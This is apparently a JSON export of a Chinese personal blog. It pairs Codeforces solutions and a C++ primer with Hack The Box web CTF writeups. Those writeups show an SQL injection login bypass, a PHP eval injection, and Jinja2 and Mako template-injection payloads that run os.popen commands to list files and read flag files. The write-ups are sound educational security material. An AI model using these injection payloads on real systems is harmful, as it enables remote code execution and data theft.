Writeup","slug":"CTF/Misc/HTB-Art-Writeup","date":"2025-03-28T22:46:02.000Z","updated":"2025-04-02T21:33:27.623Z","comments":true,"path":"2025/03/28/CTF/Misc/HTB-Art-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Misc/HTB-Art-Writeup/","excerpt":"","text":"题目描述 会拿到一张这样的图片： 题解这是Piet，一种esolang（esoteric programming language）。（详见https://en.wikipedia.org/wiki/Esoteric_programming_language#Piet） 这道题就是很典型的“知道就很简单，不知道就完全没法做”。 可以用这个网站在线运行： https://www.bertnase.de/npiet/npiet-execute.php 然后得到flag：HTB{p137_m0ndr14n}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/tags/Piet/"}]},{"title":"HTB-sanitize Writeup","slug":"CTF/Web/HTB-sanitize-Writeup","date":"2025-03-28T19:12:23.000Z","updated":"2025-04-02T21:32:15.403Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-sanitize-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Web/HTB-sanitize-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 随便输入个username和password会看到下方有一段SQL代码： 渗透猜测网页的登录逻辑是这样的：如果当前select成功（也就是说能在数据库里找到当前输入的账号信息），那么就可以登录成功。 所以直接SQL Injection，在username一栏输入 1admin&#x27; -- ，然后password那一栏输入任意内容（比如说1），就可以得到flag：HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/tags/SQL-Injection/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"}]},{"title":"HTB-LoveTok Writeup","slug":"CTF/Web/HTB-LoveTok-Writeup","date":"2025-03-28T10:30:49.000Z","updated":"2025-04-02T21:32:01.646Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-LoveTok-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Web/HTB-LoveTok-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 当点击了下面那个按钮之后网页的url会增加一个参数： 1/?format=r 因为给的附件比较多，所以直接挨个搜索“format”，可以确定下来2份相关代码： 12345678910&lt;?phpclass TimeController&#123; public function index($router) &#123; $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] : &#x27;r&#x27;; $time = new TimeModel($format); return $router-&gt;view(&#x27;index&#x27;, [&#x27;time&#x27; =&gt; $time-&gt;getTime()]); &#125;&#125; 这里会直接接收（没有过滤）我们传入的 format 的值，然后调用 TimeModel 处理这个值。 123456789101112131415161718&lt;?phpclass TimeModel&#123; public function __construct($format) &#123; $this-&gt;format = addslashes($format); # 把用户输入的 format 做了 addslashes() 处理，会把 &quot;, &#x27;, \\, NULL 这些内容前面加上反斜杠进行转义。 [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ]; $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;; &#125; public function getTime() &#123; eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;); return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;; &#125;&#125; 注意，PHP 的 eval() 函数会把传入的字符串当作 PHP 代码来执行。所以这道题可以通过注入php代码（不能包含 %}，{% kbd ' %}，{% kbd %}，{% kbd NULL %}）来获取flag。 首先尝试 1/?format=$&#123;system(ls)&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"PHP 代码注入","slug":"PHP-代码注入","permalink":"https://archer-baiyi.github.io/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"}]},{"title":"Codeforce Dragons","slug":"算法竞赛/Codeforce/1000/Codeforce-Dragons","date":"2025-03-28T10:15:13.000Z","updated":"2025-04-02T11:06:13.363Z","comments":true,"path":"2025/03/28/算法竞赛/Codeforce/1000/Codeforce-Dragons/","permalink":"https://archer-baiyi.github.io/2025/03/28/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Dragons/","excerpt":"","text":"题目描述 思路这道题的重点是可以自由挑选打龙的顺序，所以可以用vector来存储所有x，y的值，然后进行排序。 代码C++1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt; // for sortusing namespace std;int main() { int s, n; cin &gt;&gt; s &gt;&gt; n; vector&lt;pair&lt;int, int&gt;&gt; dragons(n); // 每条龙是一个(x, y)的vector for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; dragons[i].first &gt;&gt; dragons[i].second; // first 是 x，second 是 y } // 按照龙的强度从小到大排序 // 默认先按照 pair 的 first 升序排列。如果 first 相等，再按照 second 升序排列 // begin和end会对所有内容进行排序。 sort(dragons.begin(), dragons.end()); for (int i = 0; i &lt; n; ++i) { if (s &gt; dragons[i].first) { s += dragons[i].second; // 赢了，加数值的奖励 } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; return 0; } } cout &lt;&lt; \"YES\" &lt;&lt; endl; return 0;} 如果是降序的话需要写成 123sort(dragons.begin(), dragons.end(), [](pair&lt;int, int&gt; a, pair&lt;int, int&gt; b) { return a.first &gt; b.first;});","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/tags/sortings/"}]},{"title":"HTB Templated Writeup","slug":"CTF/Web/HTB-Templated-Writeup","date":"2025-03-27T20:02:53.000Z","updated":"2025-04-02T21:32:23.748Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Templated-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/27/CTF/Web/HTB-Templated-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网站会发现一片空白： 专门提示了是Jinja2，所以大概率是注入，而Jinja2注入的格式为 1{{ code }} （以下用server来指代当前网址） 因为没有给网页源代码，所以只能不断尝试。然后会发现当将当前url修改成 1server/{{7*7}} 时，会显示 可以看到 7*7 确实被执行了，所以确定这里就是注入口。 渗透有至少2种方法： 第一种通过模板中函数对象的 __globals__ 拿到全局作用域，然后借助 ____builtins__[__import__]__ 导入 os ，用 os.popen() 执行命令。 核心链路： 1234567891011self↓__init__ ← 模板函数对象↓__globals__ ← 函数的全局变量字典↓__builtins__['__import__'] ← 导入函数↓__import__('os') ← 导入 os 模块↓os.popen('命令').read() ← 执行命令并读取结果 按以下顺序注入： 1{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 或 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} 确认了当前注入方式可行。 然后查找 flag 文件： 1{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}} 最后直接读取flag： 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }} 第二种使用这个模板来发起命令执行（RCE）攻击： 1{{ [].__class__.__base__.__subclasses__()[&lt;index&gt;].__init__.__globals__['os'].popen('id').read() }} （需要找到popen对应的index） 首先用 1{{ [].__class__.__base__.__subclasses__() }} 列出所有 subclasses，然后通过 12345{% for c in [].__class__.__base__.__subclasses__() %} {% if 'Popen' in c.__name__ %} {{ loop.index0 }}: {{ c }} {% endif %}{% endfor %} 找到 popen 的index： 通过尝试 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('id').read() }} 确认可以成功RCE。 接着就跟之前一样先找然后再读取flag： 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('ls').read() }} 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('cat flag.txt').read() }} 拿到flag：HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/tags/Jinja2/"}]},{"title":"HTB Spookifier Writeup","slug":"CTF/Web/HTB-Spookifier-Writeup","date":"2025-03-27T17:16:33.000Z","updated":"2025-04-02T21:32:19.507Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Spookifier-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/27/CTF/Web/HTB-Spookifier-Writeup/","excerpt":"","text":"题目描述 （有附件） 解题观察打开网站： 输入 “abc“ 会看到： 然后我们来查看代码（routes.py）： 1234567891011121314from flask import Blueprint, requestfrom flask_mako import render_templatefrom application.util import spookifyweb = Blueprint('web', __name__)@web.route('/')def index(): text = request.args.get('text') if(text): converted = spookify(text) return render_template('index.html',output=converted) return render_template('index.html',output='') 可以看到网页会将我们的输入经过 sppokify() 函数转换一下再进行输出。 所以我们接着来查看 util.py ： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from mako.template import Templatefont1 = { 'A': '𝕬', 'B': '𝕭', 'C': '𝕮', ...}font2 = { 'A': 'ᗩ', 'B': 'ᗷ', 'C': 'ᑢ', ...}font3 = { 'A': '₳', 'B': '฿', 'C': '₵', ...} font4 = { 'A': 'A', 'B': 'B', 'C': 'C', ...}# 注意，这里的font4收录了所有的字母数字以及符号，并没有做任何修改。def generate_render(converted_fonts): result = ''' &lt;tr&gt; &lt;td&gt;{0}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{1}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{2}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{3}&lt;/td&gt; &lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render()def change_font(text_list): text_list = [*text_list] current_font = [] all_fonts = [] add_font_to_list = lambda text,font_type : ( [current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear() ) and None add_font_to_list(text_list, 'font1') add_font_to_list(text_list, 'font2') add_font_to_list(text_list, 'font3') add_font_to_list(text_list, 'font4') return all_fontsdef spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) 可以看到定义了4种字体以及输出的页面格式。change_font() 和 spookify() 则负责转换字体。 假设我们输入了 ”input“，那么服务器按照以下流程来处理我们的输入： 接收我们的输入并赋值给 text： 1text = request.args.get('text') 调用 spookify(text)： 1converted = spookify(text) 123def spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) 最后再利用 generate_render() 创建模板： 123456789def generate_render(converted_fonts): result = ''' &lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{3}&lt;/td&gt;&lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render() 注意，因为 font4 完全不会修改我们输入的内容，所以我们输入的所以内容（包括各种特殊符号）都会保留下来并被渲染进 {3} 的位置。 漏洞+渗透这道题主要考察的是 Template Injection（模板注入）： 模板注入是指攻击者将恶意代码注入到模板引擎中，使模板引擎在渲染时执行攻击者控制的表达式，造成信息泄露、RCE（远程代码执行）等后果。 漏洞主要由这几部分一起构成： 没有对输入内容进行过滤； font4会保留我们的所有输入内容 使用 Template(…).render() 动态渲染字符串模板 Mako里刚好有表达式语法： 1${} 所以导致我们输入 1${7*7} 时，mako会在渲染这部分内容 1234&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;${7*7}&lt;/td&gt;&lt;/tr&gt; 时，执行我们的代码，即 ${7*7}。所以最后的渲染结果是： 1&lt;tr&gt;&lt;td&gt;49&lt;/td&gt;&lt;/tr&gt; 这样子就我们说明注入成功了，接下来就是考虑如何读取flag了。 因为Mako 的底层代码会把 ${ } 表达式里的内容编译成 Python 代码，然后直接执行。所以我们直接注入python代码即可。 首先尝试 1${__import__('os').popen('ls').read()} 其中 1.popen('ls') 会执行 ls 命令（默认是当前工作目录），而 1.read() 会把命令输出读取成字符串。 可以看到 意味着当前目录下没有flag。我们接着查看上一级目录里的内容： 1${__import__('os').popen('ls ..').read()} 成功找到 flag.txt 文件。最后直接读取就好： 1${__import__('os').popen('cat ../flag.txt').read()} 得到flag：HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/tags/Mako/"}]},{"title":"Codeforce Chat room","slug":"算法竞赛/Codeforce/1000/Codeforce-Chat-room","date":"2025-03-27T12:13:26.000Z","updated":"2025-04-02T11:06:00.595Z","comments":true,"path":"2025/03/27/算法竞赛/Codeforce/1000/Codeforce-Chat-room/","permalink":"https://archer-baiyi.github.io/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Chat-room/","excerpt":"","text":"题目描述 思路利用一个index/指针来逐个匹配目标字符串 “hello”。从j=0开始，如果找到了j就加一。如果最后j=5的话就说明找到了。 代码C++12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { string s; cin &gt;&gt; s; string target = \"hello\"; int j = 0; for (char c : s) { if (c == target[j]) { j++; } if (j == target.size()) { break; } } if (j == target.size()) { cout &lt;&lt; \"YES\" &lt;&lt; endl; } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"Codeforce Lucky Division","slug":"算法竞赛/Codeforce/1000/Codeforce-Lucky-Division","date":"2025-03-27T12:06:28.000Z","updated":"2025-04-02T11:06:22.990Z","comments":true,"path":"2025/03/27/算法竞赛/Codeforce/1000/Codeforce-Lucky-Division/","permalink":"https://archer-baiyi.github.io/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Lucky-Division/","excerpt":"","text":"题目描述 思路写2个函数，第一个判断一个数是否是（严格的）lucky number，第二个函数遍历所有的lucky number判断是否是当前n的因数。 代码C++12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// 判断一个数字是否是 lucky number（只含有 4 或 7）bool is_lucky(int num) { string s = to_string(num); // 比如说会把47转成\"47\" for (char c : s) { // 会遍历string中的每个字母 if (c != '4' &amp;&amp; c != '7') { return false; } } return true;}// 判断是否是 almost lucky numberstring is_almost_lucky(int n) { for (int i = 1; i &lt;= n; ++i) { if (is_lucky(i) &amp;&amp; n % i == 0) { return \"YES\"; } } return \"NO\";}int main() { int n; cin &gt;&gt; n; cout &lt;&lt; is_almost_lucky(n) &lt;&lt; endl; return 0;} Python12345678910111213def is_lucky(num): # 判断一个数字是不是 lucky number（只含 4 或 7） return all(c in '47' for c in str(num))def is_almost_lucky(n): # 枚举 1 到 n 的所有 lucky number for i in range(1, n + 1): if is_lucky(i) and n % i == 0: return \"YES\" return \"NO\"n = int(input())print(is_almost_lucky(n))","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"C++ 入门","slug":"编程/Cpp-入门","date":"2025-03-26T21:47:10.000Z","updated":"2025-03-26T22:40:07.069Z","comments":true,"path":"2025/03/26/编程/Cpp-入门/","permalink":"https://archer-baiyi.github.io/2025/03/26/%E7%BC%96%E7%A8%8B/Cpp-%E5%85%A5%E9%97%A8/","excerpt":"","text":"Hello World老规矩还是先见识一下输出“Hello World!”： 12345678#include &lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; &quot;Hello World!&quot;; return 0;&#125; 注意几点： #include 这一部分和c是一样的，但是后面的库的名字是不同的； using namespace std; 是为了不需要后面每次使用像 cout 时得写全成 std::cout 。而且记得一定要在后面加上 ;； cout 是c output，想输出什么东西都得按照 cout","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"},{"name":"cpp","slug":"cpp","permalink":"https://archer-baiyi.github.io/tags/cpp/"}]},{"title":"Codeforce-String Task","slug":"算法竞赛/Codeforce/1000/Codeforce-String-Task","date":"2025-03-26T13:02:00.000Z","updated":"2025-04-02T11:06:33.027Z","comments":true,"path":"2025/03/26/算法竞赛/Codeforce/1000/Codeforce-String-Task/","permalink":"https://archer-baiyi.github.io/2025/03/26/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-String-Task/","excerpt":"","text":"题目描述 思路代码Python1234567891011121314word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]# deletes all the vowelsword = ''.join(c for c in word if c.upper() not in V)# replaces all uppercase consonants with corresponding lowercase ones.word = word.lower()# inserts a character \".\" before each consonant,word = ''.join('.' + c for c in word)print(word) 优化： 12345word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]print(''.join('.' + c.lower() for c in word if c.upper() not in V)) C1 C++1","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"Codeforce Next Round","slug":"算法竞赛/Codeforce/800/Codeforce-Next-Round","date":"2025-03-25T21:17:50.000Z","updated":"2025-04-02T11:05:31.486Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Next-Round/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Next-Round/","excerpt":"","text":"题目描述 思路先统计前 k 个分数中大于 0 的数量。因为分数是递减排列的，只需继续统计从第 k 个位置开始，所有与第 k 个分数相等的连续分数个数。最后的总合就是结果。 代码Python12345678910111213141516171819n_k = input().split()n = int(n_k[0])k = int(n_k[1])n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_list[:k] for i in range(k,n): if n_list[i] == comp: n1_list.append(n_list[i]) else: breakcount = sum(1 for x in n1_list if x &gt; 0)# print(n1_list)print(count) 优化： 1234n, k = map(int, input().split())scores = list(map(int, input().split()))threshold = scores[k - 1]print(sum(s &gt;= threshold and s &gt; 0 for s in scores)) 用numpy的： 1234567import numpy as npn, k = map(int, input().split())scores = np.array(list(map(int, input().split())))threshold = scores[k - 1]result = np.sum((scores &gt;= threshold) &amp; (scores &gt; 0))print(result) C12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int main() { int n, k; scanf(\"%d %d\", &amp;n, &amp;k); int scores[100]; // 假设最大不超过 100 个分数 for (int i = 0; i &lt; n; i++) { scanf(\"%d\", &amp;scores[i]); } int threshold = scores[k - 1]; // 第 k 个选手的分数（索引从 0 开始） int count = 0; // 前 k 个中统计 &gt;0 且 &gt;= threshold 的分数 for (int i = 0; i &lt; k; i++) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } // 从第 k 个开始，统计连续等于 threshold 的（也必须 &gt;0） for (int i = k; i &lt; n; i++) { if (scores[i] == threshold &amp;&amp; scores[i] &gt; 0) { count++; } else { break; } } printf(\"%d\\n\", count); return 0;} C++12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; scores[i]; } int threshold = scores[k - 1]; int count = 0; for (int i = 0; i &lt; n; ++i) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } cout &lt;&lt; count &lt;&lt; endl; return 0;} 用ranges： 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;ranges&gt;using namespace std;namespace ranges = std::ranges;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int&amp; score : scores) { cin &gt;&gt; score; } int threshold = scores[k - 1]; auto advancers = scores | ranges::views::filter([threshold](int x) { return x &gt;= threshold &amp;&amp; x &gt; 0; }); cout &lt;&lt; ranges::distance(advancers) &lt;&lt; endl; return 0;} Remark1. 如果只是 1n,k = input().split() 的话只会将n,k赋值成2个string，而不是int，所以需要这一步将它们转成2个int： 123n_k = input().split()n = int(n_k[0])k = int(n_k[1]) list那里的处理也是同理。 2. 如果直接写 12345678n_list = list(map(int, input().split()))comp = n_list[k-1]for i in range(k,n): if n_list[i] == comp: n_list.append(n_list[i]) else: break 的话，会导致遍历一个列表的同时又在修改它，会导致结果不可控。 但就算是改成了 12345678910n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_listfor i in range(k,n): if n1_list[i] == comp: n_list.append(n1_list[i]) else: break 也不对，因为在python里n1_list 并不是 n_list 的复制品，而只是同一个列表的两个名字。这样只是让 n1_list 和 n_list 指向同一个列表对象，修改任何一个，都会影响另一个。所以会出现跟之前一模一样的结果。 创建独立的副本需要： 123456n1_list = n_list[:]# 或n1_list = list(n_list)# 或import copyn1_list = copy.copy(n_list) （注意：python里的list[a:b]是前闭后开，所以这个不包含list[b]） 3. 假如这道题的input是乱序的，那么需要先将input排序了再进行后续操作。 python的话非常简单： 12345678910111213input = [3, 1, 4, 1, 5, 9]#升序：input.sort() # 原地排序，修改 input 本身# 或者input = sorted(input) # 返回新排序后的列表#降序：input.sort(reverse=True)# 或者input = sorted(input, reverse=True) c就很麻烦了： 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int cmp(const void *a, const void *b) { return (*(int *)a - *(int *)b); // 升序 // return (*(int *)b - *(int *)a); // 降序}int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); qsort(arr, n, sizeof(int), cmp); // 排序调用 for (int i = 0; i &lt; n; i++) { printf(\"%d \", arr[i]); } return 0;} 因为 qsort()（通用的排序函数）是泛型函数，它不能直接比较 int 或 float，我们必须手动告诉它“怎么比较两个值”。 相比之下c++就会方便很多，因为有内置的函数： 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;functional&gt; // 降序会需要using namespace std;int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); sort(arr, arr + n); // 默认升序排序 // sort(arr, arr + n, greater&lt;int&gt;()); 降序 for (int i = 0; i &lt; n; i++) { cout &lt;&lt; arr[i] &lt;&lt; \" \"; } return 0;} 也可以直接用cpp的 vector&lt;int&gt; 1234567891011121314151617#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;int main() { vector&lt;int&gt; v = {3, 1, 4, 1, 5, 9}; sort(v.begin(), v.end()); // 升序 // sort(v.begin(), v.end(), greater&lt;int&gt;()); // 降序 for (int x : v) { cout &lt;&lt; x &lt;&lt; \" \"; } return 